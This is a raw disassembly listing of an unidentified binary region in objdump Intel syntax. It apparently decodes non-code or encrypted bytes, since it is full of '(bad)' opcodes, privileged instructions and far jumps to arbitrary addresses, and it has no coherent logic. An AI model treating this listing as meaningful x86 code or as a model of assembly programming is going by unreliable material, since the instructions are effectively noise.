  42be66:	jo     0x42bdff
  42be68:	out    0xdb,eax
  42be6a:	mov    edx,0x8352ec49
  42be6f:	xchg   esi,eax
  42be70:	jmp    0x42be33
  42be72:	(bad)  
  42be73:	xchg   ecx,eax
  42be74:	out    dx,al
  42be75:	mov    edx,cs
  42be77:	pushf  
  42be78:	into   
  42be79:	iret   
  42be7a:	out    dx,al
  42be7b:	cs inc ebx
  42be7d:	sahf   
  42be7e:	pop    ecx
  42be7f:	cmc    
  42be80:	xchg   ecx,eax
  42be81:	jo     0x42bef5
  42be83:	inc    edi
  42be84:	mov    eax,0xbaf87f72
  42be89:	frstor [edi-0x36ad45d1]
  42be8f:	mov    dh,0x5d
  42be91:	xchg   DWORD PTR ds:0x98325fbc,esi
  42be97:	cmp    BYTE PTR [eax+0xa89dc7d],0x3
  42be9e:	or     al,0x0
  42bea0:	cmp    al,0x65
  42bea2:	fiadd  DWORD PTR [ecx]
  42bea4:	jne    0x42be91
  42bea6:	or     DWORD PTR [ecx-0x53fa87a],ecx
  42beac:	dec    edi
  42bead:	rcr    BYTE PTR [esi],cl
  42beaf:	adc    dl,dl
  42beb1:	outs   dx,BYTE PTR ds:[esi]
  42beb2:	outs   dx,BYTE PTR ds:[esi]
  42beb3:	cdq    
  42beb4:	mov    ah,BYTE PTR ds:0xb5cfefd6
  42beba:	mov    esi,0x87012cf3
  42bebf:	dec    edx
  42bec0:	pop    ss
	...
  42bf31:	add    BYTE PTR [eax],al
  42bf33:	add    cl,bh
  42bf35:	enter  0xdc7a,0x7b
  42bf39:	(bad)  
  42bf3a:	(bad)  
  42bf3b:	in     eax,dx
  42bf3c:	out    dx,al
  42bf3d:	mov    ah,0x3
  42bf3f:	dec    ecx
  42bf40:	mov    cl,0xd9
  42bf42:	mov    ah,0xea
  42bf44:	cli    
  42bf45:	rol    BYTE PTR [ecx],1
  42bf47:	add    ch,dh
  42bf49:	add    BYTE PTR [eax],al
  42bf4b:	add    ah,ch
  42bf4d:	pop    edi
  42bf4e:	jp     0x42beee
  42bf50:	jns    0x42bf13
  42bf52:	in     al,dx
  42bf53:	xchg   ecx,eax
  42bf54:	into   
  42bf55:	sbb    eax,0x3f34b4a5
  42bf5a:	xchg   esp,eax
  42bf5b:	mov    ah,0x15
  42bf5d:	test   BYTE PTR [ebx+0x7ca09305],bh
  42bf63:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42bf64:	popa   
  42bf65:	ins    DWORD PTR es:[edi],dx
  42bf66:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42bf67:	cdq    
  42bf68:	cld    
  42bf69:	je     0x42bf87
  42bf6b:	and    dl,BYTE PTR [ecx]
  42bf6d:	jp     0x42bf64
  42bf6f:	bound  esi,QWORD PTR [eax+esi*8]
  42bf72:	inc    edx
  42bf73:	push   ss
  42bf74:	pop    edx
  42bf75:	or     edx,eax
  42bf77:	cdq    
  42bf78:	dec    ch
  42bf7a:	xchg   esi,eax
  42bf7b:	arpl   WORD PTR [esi-0x7d],bp
  42bf7e:	mov    BYTE PTR [eax-0x4ca23793],bh
  42bf84:	nop
  42bf85:	sar    BYTE PTR [edx],1
  42bf87:	xchg   ecx,eax
  42bf88:	dec    eax
  42bf89:	(bad)  
  42bf8a:	neg    BYTE PTR [ecx]
  42bf8c:	sbb    eax,DWORD PTR [ebx]
  42bf8e:	fstp   st(7)
  42bf90:	adc    dl,BYTE PTR [ecx-0x20]
  42bf93:	fidiv  DWORD PTR ds:0x4b0d4053
  42bf99:	jbe    0x42bf78
  42bf9b:	sahf   
  42bf9c:	dec    esp
  42bf9d:	mov    al,0x64
  42bf9f:	aad    0xd5
  42bfa1:	adc    ebp,esp
  42bfa3:	lahf   
  42bfa4:	loopne 0x42bf38
  42bfa6:	cdq    
  42bfa7:	xor    DWORD PTR [eax],eax
  42bfa9:	nop
  42bfaa:	cmp    al,0x83
  42bfac:	in     al,dx
  42bfad:	mov    esi,fs
  42bfaf:	push   edx
  42bfb0:	sub    bh,BYTE PTR [esi+ebx*2+0x4b]
  42bfb4:	sub    ebp,esp
  42bfb6:	(bad)  
  42bfb7:	rcr    BYTE PTR [edi-0x7b],1
  42bfba:	pop    esp
  42bfbb:	test   al,0x4d
  42bfbd:	xor    BYTE PTR [ebx-0x15],0x9a
  42bfc1:	push   esi
  42bfc2:	test   ecx,esi
  42bfc4:	ret    0xe0c4
  42bfc7:	mov    bh,0xd7
  42bfc9:	sbb    dh,bl
  42bfcb:	inc    esi
  42bfcc:	(bad)  [ebx]
  42bfce:	imul   esp,ebx,0xffffff9e
  42bfd1:	ret    0x493e
  42bfd4:	or     DWORD PTR [eax+0x56624b14],eax
  42bfda:	fadd   QWORD PTR [esi-0x5d]
  42bfdd:	pop    ebx
  42bfde:	jmp    0xc889:0xa08f59c4
  42bfe5:	cwde   
  42bfe6:	int    0xdf
  42bfe8:	mov    ecx,0xf1ec4a00
  42bfed:	xchg   esi,eax
  42bfee:	adc    cl,bl
  42bff0:	jae    0x42c01a
  42bff2:	dec    esp
  42bff3:	cmp    BYTE PTR [eax-0x60732dc],ah
  42bff9:	ret    0x4428
  42bffc:	in     al,dx
  42bffd:	mov    bl,ah
  42bfff:	cmp    ch,BYTE PTR [ebx]
  42c001:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42c002:	mov    ds:0x190325ff,al
  42c007:	xor    ecx,esp
  42c009:	xor    WORD PTR [ebx-0x2c54091a],dx
  42c010:	jnp    0x42c026
  42c012:	mov    edi,0xa0ba4e43
  42c017:	scas   eax,DWORD PTR es:[edi]
  42c018:	gs sbb eax,0x2a460507
  42c01e:	pop    esp
  42c01f:	lea    esp,[ecx]
  42c021:	jne    0x42c031
  42c023:	gs cmc 
  42c025:	iret   
  42c026:	pop    es
  42c027:	in     al,dx
  42c028:	dec    ebx
  42c029:	jnp    0x42c04a
  42c02b:	shl    DWORD PTR [ecx-0x1a84856e],0x3d
  42c032:	lds    esp,FWORD PTR [edi+0xb828453]
  42c038:	popf   
  42c039:	jbe    0x42c072
  42c03b:	pushf  
  42c03c:	adc    al,0x3f
  42c03e:	cmc    
  42c03f:	sbb    ebp,0x0
	...
  42c0b2:	add    BYTE PTR [eax],al
  42c0b4:	jne    0x42c0db
  42c0b6:	imul   ebx,DWORD PTR [edi-0x51]
  42c0ba:	cmc    
  42c0bb:	(bad)  
  42c0bc:	call   0x942915
  42c0c1:	push   esp
  42c0c2:	dec    ebx
  42c0c3:	ret    0xd1ef
  42c0c6:	add    DWORD PTR [eax],eax
  42c0c8:	cmc    
  42c0c9:	add    BYTE PTR [eax],al
  42c0cb:	add    BYTE PTR [esi+0x7b4d9043],bh
  42c0d1:	xchg   ebp,eax
  42c0d2:	and    dh,ch
  42c0d4:	shl    BYTE PTR [edx+edx*4-0x68e028e5],cl
  42c0db:	fs mov esp,0x5f592732
  42c0e1:	and    dl,ch
  42c0e3:	xchg   BYTE PTR [esi+0x60092573],al
  42c0e9:	(bad)  
  42c0eb:	int3   
  42c0ec:	xor    bl,BYTE PTR [edx-0x8]
  42c0ef:	call   0xcea0:0x73d65fd8
  42c0f6:	iret   
  42c0f7:	stos   BYTE PTR es:[edi],al
  42c0f8:	jmp    0x6c47:0xfa1a9612
  42c0ff:	or     bl,bl
  42c101:	add    ebx,DWORD PTR [ecx-0x33205f66]
  42c107:	mov    ch,0x7c
  42c109:	hlt    
  42c10a:	dec    edx
  42c10b:	inc    ecx
  42c10c:	stos   BYTE PTR es:[edi],al
  42c10d:	mov    esi,0x17fd9b3f
  42c112:	add    eax,0x8cdde060
  42c117:	test   DWORD PTR [esi+0x1ba45e55],0x9537ccd1
  42c121:	xor    al,0x5b
  42c123:	add    eax,0xf6649fb2
  42c128:	and    BYTE PTR [ebx],0x80
  42c12b:	mov    ?,WORD PTR [edx-0x76]
  42c12e:	push   0xffffffa8
  42c130:	mov    ebp,0x633009c0
  42c135:	and    cl,BYTE PTR [esi+eax*2+0x62cdab30]
  42c13c:	xchg   ecx,eax
  42c13d:	push   ds
  42c13e:	cwde   
  42c13f:	push   edx
  42c140:	xchg   esp,eax
  42c141:	sbb    al,0x12
  42c143:	outs   dx,BYTE PTR ds:[esi]
  42c144:	clc    
  42c145:	pop    ss
  42c146:	push   ebp
  42c147:	pop    ss
  42c148:	ins    DWORD PTR es:[edi],dx
  42c149:	and    cx,WORD PTR [ebx-0x22]
  42c14d:	sbb    BYTE PTR [ebx+0x60],0xa8
  42c151:	jg     0x42c14b
  42c153:	inc    ebx
  42c154:	mov    ds,WORD PTR es:[esi+0x93d24a7]
  42c15b:	mov    eax,0x91ef1efa
  42c160:	cmp    BYTE PTR [esi],ah
  42c162:	imul   esi,DWORD PTR [ebp+0x62940ba1],0x38
  42c169:	and    ebp,ecx
  42c16b:	pushfw 
  42c16d:	mov    esi,0x53fb6c4c
  42c172:	xchg   esp,eax
  42c173:	push   ebx
  42c174:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42c175:	nop
  42c176:	fcom   DWORD PTR [eax-0x7a]
  42c179:	adc    ax,0xb2da
  42c17d:	fist   DWORD PTR [edi-0x75dca053]
  42c184:	lea    edi,[edi-0x29]
  42c187:	jne    0xa955435f
  42c18d:	jb     0x42c186
  42c18f:	ja     0x42c1bb
  42c191:	pop    ds
  42c192:	jecxz  0x42c17b
  42c194:	dec    edx
  42c195:	adc    edx,DWORD PTR [esi-0x58bbad40]
  42c19b:	mov    bh,0x26
  42c19d:	cmp    bh,BYTE PTR [edi+ecx*1]
  42c1a0:	sbb    bl,BYTE PTR [ebp+edi*4-0x52e94d04]
  42c1a7:	sbb    eax,DWORD PTR [esi-0x13438dee]
  42c1ad:	jno    0x42c133
  42c1af:	call   0x280b0db0
  42c1b4:	(bad)  
  42c1b5:	jbe    0x42c18f
  42c1b7:	xchg   ebx,eax
  42c1b8:	adc    ah,BYTE PTR [edi-0x7e]
  42c1bb:	mov    dl,0x5a
  42c1bd:	xor    edx,ebx
  42c1bf:	mov    edi,DWORD PTR [eax+0x0]
	...
  42c231:	add    BYTE PTR [eax],al
  42c233:	add    BYTE PTR [ebp-0x449f6672],ah
  42c239:	ja     0x42c238
  42c23b:	iret   
  42c23c:	xchg   esp,eax
  42c23d:	xor    edx,DWORD PTR [ecx+ebp*1+0x21]
  42c241:	sbb    eax,0xd2e49d77
  42c246:	add    DWORD PTR [eax],eax
  42c248:	cmc    
  42c249:	add    BYTE PTR [eax],al
  42c24b:	add    al,ch
  42c24d:	mov    edx,0xd504016
  42c252:	out    0xa5,eax
  42c254:	idiv   BYTE PTR [edi+0x25f71b79]
  42c25a:	aad    0x49
  42c25c:	xor    BYTE PTR [eax],0xd1
  42c25f:	scas   eax,DWORD PTR es:[edi]
  42c260:	adc    DWORD PTR [edx+0x1ac68924],edx
  42c266:	mov    ch,BYTE PTR [eax+0x22]
  42c269:	mov    esi,?
  42c26b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42c26c:	jb     0x42c25d
  42c26e:	pushf  
  42c26f:	mov    esp,ecx
  42c271:	mov    ds:0x3bd6e7a,al
  42c276:	jge    0x42c2f7
  42c278:	lods   eax,DWORD PTR ds:[esi]
  42c279:	jmp    0x42c24d
  42c27b:	test   edi,esi
  42c27d:	aas    
  42c27e:	stc    
  42c27f:	mov    edi,0x8d19fc0f
  42c284:	nop
  42c285:	pop    ebx
  42c286:	xor    DWORD PTR [edi],edi
  42c288:	sti    
  42c289:	pop    ebp
  42c28a:	pop    ss
  42c28b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42c28c:	xor    DWORD PTR [eax],esi
  42c28e:	aas    
  42c28f:	pop    esi
  42c290:	imul   esp,DWORD PTR [ebx-0x73d9c29b],0xecc477c
  42c29a:	pop    esp
  42c29b:	outs   dx,DWORD PTR ds:[esi]
  42c29c:	mov    bh,0xab
  42c29e:	rcl    DWORD PTR [edi-0x27],1
  42c2a1:	xchg   edi,eax
  42c2a2:	pop    esp
  42c2a3:	push   eax
  42c2a4:	inc    ecx
  42c2a5:	cmp    DWORD PTR [edi-0x656c1d06],ecx
  42c2ab:	mov    BYTE PTR [edi],dh
  42c2ad:	ins    DWORD PTR es:[edi],dx
  42c2ae:	jno    0x42c299
  42c2b0:	push   cs
  42c2b1:	mov    al,ds:0x23295123
  42c2b6:	mov    edi,DWORD PTR [ebp+0x78]
  42c2b9:	test   eax,0xf24b9c44
  42c2be:	inc    edx
  42c2bf:	mov    BYTE PTR [edi],dl
  42c2c1:	mov    edi,DWORD PTR [ecx]
  42c2c3:	aam    0x57
  42c2c5:	adc    eax,esp
  42c2c7:	jecxz  0x42c2e0
  42c2c9:	rcr    DWORD PTR [edi],cl
  42c2cb:	test   eax,0xfcad2476
  42c2d0:	ficom  WORD PTR [edi-0x128ef552]
  42c2d6:	ins    BYTE PTR es:[edi],dx
  42c2d7:	push   ss
  42c2d8:	shl    DWORD PTR [ebx-0xf],1
  42c2db:	mov    eax,0xf5b15802
  42c2e0:	mov    DWORD PTR [ebp+0x3f],ebx
  42c2e3:	jge    0x42c302
  42c2e5:	fwait
  42c2e6:	test   eax,0x69d77cb4
  42c2eb:	mov    ch,0xe4
  42c2ed:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42c2ee:	mov    ah,0x92
  42c2f0:	and    ah,ch
  42c2f2:	ret    0x6f4c
  42c2f5:	jmp    0x4199:0xe30bd09b
  42c2fc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42c2fd:	sbb    cl,BYTE PTR [esi+0x36fa1743]
  42c303:	mov    esi,0xf658b99
  42c308:	cmp    bh,BYTE PTR [edx-0x1ef35f4b]
  42c30e:	and    BYTE PTR [edi-0x4b],dh
  42c311:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42c312:	dec    ecx
  42c313:	out    dx,eax
  42c314:	lea    esi,[esi]
  42c316:	xor    eax,0x3bca0d0b
  42c31b:	mov    al,ds:0x9fc00a74
  42c320:	dec    edx
  42c321:	and    esi,0xffffff8e
  42c324:	ror    BYTE PTR [ecx],cl
  42c326:	dec    sp
  42c328:	xor    cl,dl
  42c32a:	mov    ebp,0x5a8dd6be
  42c32f:	mov    esi,0xdc9559ed
  42c334:	(bad)  
  42c335:	cmp    DWORD PTR [edi-0x13b4567b],ecx
  42c33b:	dec    ebx
  42c33c:	loope  0x42c306
  42c33e:	pop    es
  42c33f:	cmp    bh,BYTE PTR [ecx]
	...
  42c3b1:	add    BYTE PTR [eax],al
  42c3b3:	add    BYTE PTR [edx-0x1011dfbb],cl
  42c3b9:	out    dx,eax
  42c3ba:	into   
  42c3bb:	gs aam 0xa
  42c3be:	fst    DWORD PTR [ecx+0x23]
  42c3c1:	xor    eax,0xd3d92fa7
  42c3c6:	add    DWORD PTR [eax],eax
  42c3c8:	cmc    
  42c3c9:	add    BYTE PTR [eax],al
  42c3cb:	add    al,dh
  42c3cd:	jg     0x42c421
  42c3cf:	xor    eax,0xfb63e4ad
  42c3d4:	loope  0x42c3c8
  42c3d6:	lahf   
  42c3d7:	or     DWORD PTR [edi],ebx
  42c3d9:	mov    ecx,0xbafb80a3
  42c3de:	push   0x371fecf8
  42c3e3:	stos   BYTE PTR es:[edi],al
  42c3e4:	xchg   esp,eax
  42c3e5:	dec    esp
  42c3e6:	inc    esi
  42c3e7:	inc    esp
  42c3e8:	stc    
  42c3e9:	shl    BYTE PTR [ebx+0x30],0xc6
  42c3ed:	xchg   edi,eax
  42c3ee:	xchg   esp,eax
  42c3ef:	ins    DWORD PTR es:[edi],dx
  42c3f0:	adc    edx,0x62
  42c3f3:	jo     0x42c454
  42c3f5:	das    
  42c3f6:	inc    edi
  42c3f7:	mov    cl,0xb4
  42c3f9:	adc    ch,BYTE PTR [ebx]
  42c3fb:	jae    0x42c39e
  42c3fd:	sub    DWORD PTR [edx+0x3a],edi
  42c400:	punpckhdq mm5,QWORD PTR [edi]
  42c403:	jecxz  0x42c47a
  42c405:	icebp  
  42c406:	inc    eax
  42c407:	pushf  
  42c408:	xor    al,0x9e
  42c40a:	pop    es
  42c40b:	sbb    al,0x76
  42c40d:	in     eax,dx
  42c40e:	out    0xb3,eax
  42c410:	cld    
  42c411:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42c412:	push   es
  42c413:	mov    DWORD PTR [edi],edx
  42c415:	dec    esi
  42c416:	sbb    al,0x4
  42c418:	jge    0x42c420
  42c41a:	repz imul ebp,DWORD PTR [ecx-0x20d33c69],0xfffffffa
  42c422:	and    DWORD PTR [ebx+esi*2+0x42],ecx
  42c426:	nop
  42c427:	clc    
  42c428:	dec    ebp
  42c429:	xchg   ecx,eax
  42c42a:	pop    ds
  42c42b:	call   0x3dd178c1
  42c430:	jbe    0x42c443
  42c432:	sbb    eax,0x40ff1777
  42c437:	pop    edi
  42c438:	inc    esi
  42c439:	test   DWORD PTR [ebp-0x7d],edx
  42c43c:	jns    0x42c444
  42c43e:	xchg   esi,eax
  42c43f:	inc    eax
  42c440:	retf   0x1995
  42c443:	cdq    
  42c444:	and    ecx,ebp
  42c446:	dec    ebx
  42c447:	dec    esi
  42c448:	stc    
  42c449:	and    al,BYTE PTR [edi+0x1dd9012]
  42c44f:	leave  
  42c450:	out    0x80,al
  42c452:	aam    0x1f
  42c454:	mov    edx,0x2913ea2c
  42c459:	mov    ch,BYTE PTR [ebx+0x3a]
  42c45c:	fsubr  DWORD PTR [eax+edx*4+0x1dc45f21]
  42c463:	inc    ebp
  42c464:	(bad)  
  42c465:	mov    dl,0x2a
  42c467:	bound  eax,QWORD PTR [esi+0xf4f9099]
  42c46d:	repnz adc DWORD PTR [edi],edx
  42c470:	jge    0x42c4a5
  42c472:	cmp    BYTE PTR [eax-0x26],ah
  42c475:	push   0x8be3a3be
  42c47a:	sub    eax,0xe735e500
  42c47f:	add    dl,dh
  42c481:	adc    eax,0x7c94d5da
  42c486:	mov    ch,0x55
  42c488:	adc    al,0x54
  42c48a:	lds    eax,FWORD PTR [edx+0x16]
  42c48d:	jae    0x42c436
  42c48f:	inc    ecx
  42c490:	add    cl,dl
  42c492:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42c493:	mov    al,ds:0x5e38ef69
  42c498:	cmc    
  42c499:	and    DWORD PTR [edi-0x21f1afe3],ebx
  42c49f:	xlat   BYTE PTR ds:[ebx]
  42c4a0:	inc    ebx
  42c4a1:	ret    0x3bc7
  42c4a4:	repnz ficom DWORD PTR [ebx+0x59]
  42c4a8:	int    0xd
  42c4aa:	inc    ebx
  42c4ab:	mov    eax,ds:0xa0bbf9d0
  42c4b0:	outs   dx,BYTE PTR ds:[esi]
  42c4b1:	mov    edi,0xf6ba61a8
  42c4b6:	aaa    
  42c4b7:	sbb    eax,0xbc85ed2c
  42c4bc:	lods   al,BYTE PTR ds:[esi]
  42c4bd:	cmp    DWORD PTR [esi+0xc84f],eax
	...
  42c533:	add    al,ah
  42c535:	xchg   esp,eax
  42c536:	and    bh,cl
  42c538:	je     0x42c539
  42c53a:	out    dx,eax
  42c53b:	mov    edi,0x9a7cd6c5
  42c540:	dec    esp
  42c541:	add    esp,ebp
  42c543:	mov    cl,dh
  42c545:	aam    0x1
  42c547:	add    ch,dh
  42c549:	add    BYTE PTR [eax],al
  42c54b:	add    cl,bl
  42c54d:	std    
  42c54e:	and    BYTE PTR [eax],ah
  42c550:	push   edi
  42c551:	xor    ecx,DWORD PTR [esi-0x7e0667c3]
  42c557:	dec    esp
  42c558:	sti    
  42c559:	dec    ecx
  42c55a:	dec    ebp
  42c55b:	adc    eax,0x56fb10f6
  42c560:	push   ss
  42c561:	test   al,0x64
  42c563:	mov    ds:0x9f695939,al
  42c568:	in     eax,dx
  42c569:	xor    DWORD PTR [eax-0x6d369324],ecx
  42c56f:	add    ebp,0xffffff9f
  42c572:	imul   ebx,DWORD PTR [ecx+0x3560c9c0],0x7d
  42c579:	sub    ebx,DWORD PTR [eax+0x4ffad519]
  42c57f:	adc    DWORD PTR [ecx-0x78c9083b],ebp
  42c585:	call   0x454e5828
  42c58a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42c58b:	ret    0x478c
  42c58e:	ss es clc 
  42c591:	lahf   
  42c592:	mov    al,0xdc
  42c594:	js     0x42c525
  42c596:	lahf   
  42c597:	mov    ds:0x59e41e26,eax
  42c59c:	xor    DWORD PTR [esi],esp
  42c59e:	mov    cl,0x20
  42c5a0:	jb     0x42c542
  42c5a2:	sub    al,0x94
  42c5a4:	push   ds
  42c5a5:	ds and esp,ebx
  42c5a8:	pop    ds
  42c5a9:	into   
  42c5aa:	mul    BYTE PTR [ebp+0x1c]
  42c5ad:	push   ecx
  42c5ae:	imul   edi,DWORD PTR [esi+0x4acf4434],0xb9f31f36
  42c5b8:	pop    es
  42c5b9:	sub    eax,0x2119aa14
  42c5be:	dec    esi
  42c5bf:	xchg   edi,eax
  42c5c0:	mov    cl,BYTE PTR [ebx+edx*2-0x65]
  42c5c4:	stos   BYTE PTR es:[edi],al
  42c5c5:	pop    es
  42c5c6:	(bad)  
  42c5c7:	dec    esp
  42c5c8:	cmp    al,ch
  42c5ca:	xchg   ecx,eax
  42c5cb:	push   0xacc00e7b
  42c5d0:	retf   
  42c5d1:	inc    eax
  42c5d2:	mov    WORD PTR [edx-0x68],?
  42c5d5:	cmp    DWORD PTR [eax],ecx
  42c5d7:	mov    cl,0xf6
  42c5d9:	lods   eax,DWORD PTR ds:[esi]
  42c5da:	fwait
  42c5db:	sbb    ebx,edx
  42c5dd:	fstp   DWORD PTR [ecx]
  42c5df:	mov    ebx,0xa6869841
  42c5e4:	sub    al,BYTE PTR [ecx]
  42c5e6:	lea    ebp,[edx]
  42c5e8:	mov    edx,0x447b2f4a
  42c5ed:	adc    eax,0x65dfbfee
  42c5f2:	pop    eax
  42c5f3:	shl    DWORD PTR [ebp-0x6968161b],cl
  42c5f9:	nop
  42c5fa:	mov    DWORD PTR [ebx],eax
  42c5fc:	xor    ah,BYTE PTR [ebx]
  42c5fe:	mov    al,ds:0xab3a36b6
  42c603:	std    
  42c604:	fistp  QWORD PTR [edi-0x9]
  42c607:	xor    eax,0x536acdac
  42c60c:	pusha  
  42c60d:	sbb    BYTE PTR [eax+0x6d719650],dh
  42c613:	sbb    DWORD PTR [esi-0x74],ebp
  42c616:	xchg   ebx,eax
  42c617:	xchg   DWORD PTR [ebx-0x10],edi
  42c61a:	add    esp,esp
  42c61c:	ins    DWORD PTR es:[edi],dx
  42c61d:	ret    
  42c61e:	pushw  ds
  42c620:	add    al,0x27
  42c622:	push   cs
  42c623:	ficomp DWORD PTR [eax+0x4ae7f607]
  42c629:	inc    esi
  42c62a:	mov    ds:0x37c83dca,eax
  42c62f:	push   ss
  42c630:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42c631:	dec    esp
  42c632:	loopne 0x42c644
  42c634:	iret   
  42c635:	push   es
  42c636:	lods   al,BYTE PTR ss:[esi]
  42c638:	xchg   esi,eax
  42c639:	and    BYTE PTR [edx],dl
  42c63b:	mov    al,0xad
  42c63d:	push   edi
  42c63e:	call   0x43bf2b
	...
  42c6b3:	add    BYTE PTR [esi+0x42],cl
  42c6b6:	dec    ecx
  42c6b7:	daa    
  42c6b8:	dec    ebp
  42c6b9:	das    
  42c6ba:	outs   dx,BYTE PTR ds:[esi]
  42c6bb:	imul   ebp,esi,0x7b
  42c6be:	enter  0x5dbe,0x9d
  42c6c2:	shl    BYTE PTR [eax-0x3d],cl
  42c6c5:	aad    0x1
  42c6c7:	add    ch,dh
  42c6c9:	add    BYTE PTR [eax],al
  42c6cb:	add    BYTE PTR [ebx+esi*1+0x5a6378cc],bh
  42c6d2:	ins    DWORD PTR es:[edi],dx
  42c6d3:	enter  0x967b,0x2d
  42c6d7:	or     eax,0x4871872
  42c6dc:	adc    ah,BYTE PTR [edi-0x3839c3e]
  42c6e2:	and    esi,DWORD PTR [ebx+0x6a993a96]
  42c6e8:	stos   DWORD PTR es:[edi],eax
  42c6e9:	add    al,0xfd
  42c6eb:	das    
  42c6ec:	or     bl,dh
  42c6ee:	push   esp
  42c6ef:	test   BYTE PTR gs:[ecx-0xd8008b8],bl
  42c6f6:	sar    eax,cl
  42c6f8:	pop    ss
  42c6f9:	xor    BYTE PTR fs:[ecx],bh
  42c6fc:	inc    eax
  42c6fd:	sub    eax,0x483fb4de
  42c702:	call   0x88d4:0xc776dfe0
  42c709:	mov    DWORD PTR [edx-0x464a4d7],esi
  42c70f:	mov    dl,0xa
  42c711:	inc    ebp
  42c712:	enter  0xb7a,0x38
  42c716:	xchg   edx,eax
  42c717:	pop    es
  42c718:	call   0x39c9:0x1d65256f
  42c71f:	rcr    DWORD PTR [edx-0xe],1
  42c722:	dec    edi
  42c723:	pop    esi
  42c724:	xchg   ecx,eax
  42c725:	call   0x4664:0xd789f14f
  42c72c:	and    eax,0xacdc9fd2
  42c731:	aam    0xa5
  42c733:	and    eax,0xa2ad2c46
  42c738:	mov    cl,BYTE PTR ds:[edx*2+0x775ef0eb]
  42c740:	inc    DWORD PTR [edx-0x12]
  42c743:	dec    edx
  42c744:	test   DWORD PTR [eax+0x5b],ebp
  42c747:	jo     0x42c71d
  42c749:	push   edi
  42c74a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42c74b:	or     cl,BYTE PTR [edi]
  42c74d:	xor    ch,BYTE PTR [edx+0x23]
  42c750:	loop   0x42c71e
  42c752:	ss mov ch,0x4c
  42c755:	cli    
  42c756:	cld    
  42c757:	push   ss
  42c758:	inc    ecx
  42c759:	jle    0x42c751
  42c75b:	adc    eax,0x20984222
  42c760:	sub    BYTE PTR [ebx-0x5edcf784],dh
  42c766:	into   
  42c767:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42c768:	fnstcw WORD PTR [edx+0x34]
  42c76b:	test   DWORD PTR [ecx],eax
  42c76d:	cmp    ebx,0xffffffe1
  42c770:	xor    al,bh
  42c772:	ds mov ebp,0x8d81c9ab
  42c778:	xchg   ebx,eax
  42c779:	sbb    al,0x13
  42c77b:	xchg   BYTE PTR [eax-0x1c0262],ch
  42c781:	mov    al,ds:0x6c53b28e
  42c786:	push   edi
  42c787:	pop    edi
  42c788:	cmp    al,0x4f
  42c78a:	mov    bl,0x6c
  42c78c:	es std 
  42c78e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42c78f:	xor    BYTE PTR ds:0xf221f35d,al
  42c795:	divps  xmm4,XMMWORD PTR [eax]
  42c798:	in     eax,dx
  42c799:	fcmove st,st(6)
  42c79b:	(bad)  
  42c79c:	mov    esi,0xd28e080b
  42c7a1:	(bad)
  42c7a5:	cmp    dl,BYTE PTR [eax+0x31]
  42c7a8:	push   edi
  42c7a9:	jmp    0x42c7ec
  42c7ab:	iret   
  42c7ac:	cmp    eax,DWORD PTR [ecx-0x17]
  42c7af:	lahf   
  42c7b0:	in     al,dx
  42c7b1:	ins    DWORD PTR es:[edi],dx
  42c7b2:	push   eax
  42c7b3:	jle    0x42c73d
  42c7b5:	xchg   ebp,eax
  42c7b6:	addr16 inc ebx
  42c7b8:	push   esi
  42c7b9:	mov    cl,0xb0
  42c7bb:	sahf   
  42c7bc:	dec    eax
  42c7bd:	in     eax,dx
  42c7be:	xor    ah,0x38
	...
  42c831:	add    BYTE PTR [eax],al
  42c833:	add    al,ch
  42c835:	popf   
  42c836:	mov    esi,0xf9e7ffe7
  42c83b:	lahf   
  42c83c:	or     ch,bh
  42c83e:	fdiv   DWORD PTR ds:0x8317fe18
  42c844:	mov    eax,0xf50001d6
  42c849:	add    BYTE PTR [eax],al
  42c84b:	add    BYTE PTR [edx-0x7298158e],bl
  42c851:	sbb    BYTE PTR [eax-0x7e],dh
  42c854:	sub    edi,edi
  42c856:	scas   eax,DWORD PTR es:[edi]
  42c857:	sub    ah,al
  42c859:	fbld   TBYTE PTR [ebp+0x34]
  42c85c:	and    dl,BYTE PTR [edx]
  42c85e:	and    eax,DWORD PTR [edi+eiz*4-0x4b]
  42c862:	gs or  dl,dh
  42c865:	jmp    FWORD PTR [eax]
  42c867:	dec    edi
  42c868:	mov    dh,dl
  42c86a:	mov    ch,BYTE PTR [ebx]
  42c86c:	mov    ebx,0x33c10f72
  42c871:	jne    0x42c8a7
  42c873:	push   ecx
  42c874:	sub    BYTE PTR [ecx-0x8],0xce
  42c878:	bound  ebp,QWORD PTR [eax]
  42c87a:	inc    ebx
  42c87b:	cwde   
  42c87c:	adc    cl,BYTE PTR [edx+0x7e5da45c]
  42c882:	sub    DWORD PTR [eax+0x5acdf423],0xffffffe3
  42c889:	cmp    ebp,DWORD PTR [ebx-0x7b]
  42c88c:	cmp    ebp,DWORD PTR [ebx]
  42c88e:	push   edi
  42c88f:	mov    ds:0x9f3f7959,al
  42c894:	mov    ebp,0x8290f7d3
  42c899:	int3   
  42c89a:	outs   dx,BYTE PTR ds:[esi]
  42c89b:	adc    al,0x0
  42c89d:	(bad)  
  42c89e:	cmp    BYTE PTR [ebp+0x2941f8bb],al
  42c8a4:	pop    edi
  42c8a5:	mov    ds:0xa8f13708,al
  42c8aa:	scas   eax,DWORD PTR es:[edi]
  42c8ab:	adc    BYTE PTR [edx],bh
  42c8ad:	lock sub BYTE PTR [ecx-0x44],al
  42c8b1:	sbb    al,0x4f
  42c8b3:	mov    dl,0xf8
  42c8b5:	pop    ebx
  42c8b6:	lods   al,BYTE PTR ds:[esi]
  42c8b7:	inc    edx
  42c8b8:	dec    esi
  42c8b9:	pop    es
  42c8ba:	dec    edi
  42c8bb:	out    0x58,al
  42c8bd:	jns    0x42c889
  42c8bf:	(bad)  [eax]
  42c8c1:	cmp    ebp,0x10b57598
